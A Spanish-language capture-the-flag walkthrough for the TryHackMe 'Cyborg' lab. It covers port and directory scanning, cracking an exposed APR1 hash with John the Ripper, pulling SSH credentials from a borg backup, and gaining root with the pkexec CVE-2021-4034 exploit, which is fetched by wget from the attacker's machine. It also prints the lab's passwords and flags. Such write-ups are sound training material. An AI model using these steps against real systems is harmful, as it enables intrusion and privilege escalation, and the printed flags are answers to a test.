@@ -1,0 +1,82 @@
+TryHackMe
+Cyborg
+
+nmap:
+
+    nmap -p- -sS -sC -sV --open --min-rate 5000 -vvv -n -Pn 10.10.92.169 -oN nmap
+
+    • 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+    • 80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
+
+gobuster:
+
+    gobuster dir -u http://10.10.92.169 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
+
+    • /admin
+    • /etc
+
+Dentro de "/admin" encontramos una página y dentro de "/etc" encontramos lo siguiente: "music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn."
+El contenido en /etc parece ser un hash codificado en "APR1".
+
+Al seguir examinando la página, descubrimos que dicho hash pertenece a "Alex".
+
+Procedemos a crackear el hash con John the Ripper:
+
+    nano hash.txt
+    $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+
+    john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+    squidward
+
+Al intentar usar esta contraseña en el puerto SSH para el usuario 'alex', no obtenemos respuesta. Buscaremos otra opción. Al investigar más en la página, descubrimos que en el apartado "downloads" se descarga un archivo zip llamado "archive.tar".
+
+Procedemos a descomprimirlo:
+
+    tar -xvf archive.tar
+
+Esto nos proporciona varios directorios, en los cuales revisamos "README". Dentro de ese archivo, se nos da a entender que "archivo.tar" es un archivo de "borg-backup". Instalamos borg y procedemos a ver el contenido del archivo:
+
+    borg extract home/field/dev/final_archive/::music_archive --list
+
+Vemos que, en efecto, es un backup de toda la máquina.
+
+Dentro encontramos "home/alex/Documents/note.txt":
+
+    alex:S3cretP@s3
+
+Al usar esta contraseña en el servidor SSH, accedemos con el usuario "alex":
+
+    cat user.txt
+    flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
+
+Para escalar privilegios, tenemos lo siguiente:
+
+    sudo -l
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+
+    sudo -V
+    Sudo version 1.8.16
+
+    find / -perm -4000 2>/dev/null
+    /usr/bin/pkexec --v
+    pkexec version 0.105 (vulnerable)
+
+Decidimos aprovechar la vulnerabilidad en pkexec con un exploit en Python. Primero, creamos un servidor de Python en nuestra máquina:
+
+    python3 -m http.server 8080
+
+Luego, subimos el archivo a la máquina víctima:
+
+    wget 10.18.112.21:8080/CVE-2021-4034.py
+
+Después, ejecutamos:
+
+    python3 CVE-2021-4034.py
+
+Y ahora somos root:
+
+    locate root.txt
+    root/root.txt
+
+    cat root/root.txt
+    flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
